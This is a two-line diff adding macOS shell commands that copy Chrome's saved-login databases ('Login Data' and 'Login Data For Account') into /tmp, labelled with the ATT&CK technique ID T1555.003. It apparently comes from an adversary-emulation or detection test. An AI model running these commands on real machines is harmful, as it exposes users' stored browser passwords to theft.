@@ -1,0 +1,2 @@
+cp ~/Library/"Application Support/Google/Chrome/Default/Login Data" "/tmp/T1555.003_Login Data"
+cp ~/Library/"Application Support/Google/Chrome/Default/Login Data For Account" "/tmp/T1555.003_Login Data For Account"
